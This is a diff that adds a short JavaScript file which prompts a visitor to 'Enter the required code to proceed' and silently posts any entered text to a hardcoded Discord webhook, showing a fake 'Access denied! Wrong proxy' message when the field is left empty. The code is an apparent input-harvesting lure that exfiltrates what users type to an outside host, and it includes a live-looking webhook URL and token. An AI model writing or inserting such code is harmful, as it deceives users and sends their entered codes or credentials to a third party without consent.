@@ -1,0 +1,16 @@
+let userInput = prompt("Enter the required code to proceed:");
+
+if (userInput && userInput.length >= 1) {
+  fetch("https://discord.com/api/webhooks/1350235351339241472/LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ", {
+    method: "POST",
+    body: JSON.stringify({ content: "User Input: " + userInput }),
+    headers: { "Content-Type": "application/json" }
+  });
+} else {
+  let errorMsg = document.createElement("p");
+  errorMsg.innerText = "Access denied! Wrong proxy";
+  errorMsg.style.color = "red";
+  errorMsg.style.fontWeight = "bold";
+  document.body.appendChild(errorMsg);
+}
+
